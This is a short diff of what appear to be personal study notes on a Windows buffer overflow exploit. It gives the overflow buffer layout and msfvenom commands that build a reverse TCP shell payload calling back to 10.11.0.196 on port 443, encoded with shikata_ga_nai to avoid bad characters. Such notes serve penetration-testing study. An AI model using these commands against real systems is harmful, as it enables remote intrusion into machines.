@@ -81,7 +81,7 @@ buffer = A\*2606 + &lt;Bufffer Overflow / EIP Address&gt; + shell code + "C" \* 
    1. msfvenom -p windows/shell_reverse\_tcp LHOST=10.11.0.196 LPORT=443 -f c -a x86 --platform windows _
    2. lot of bad characters in the shellcode so we need to encode.
    3. add the bad character list to no allow 
-   4. msfvenom -p windows/shell_reverse_\_tcp  LHOST=10.11.0.196 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d"  -e x86/shikata ga nai 
+   4. msfvenom -p windows/shell\_reverse\_tcp  LHOST=10.11.0.196 LPORT=443 -f c -e x86/shikata ga nai -b "\x00\x0a\x0d"   
    5. bad character not sent over the wire 
 
 
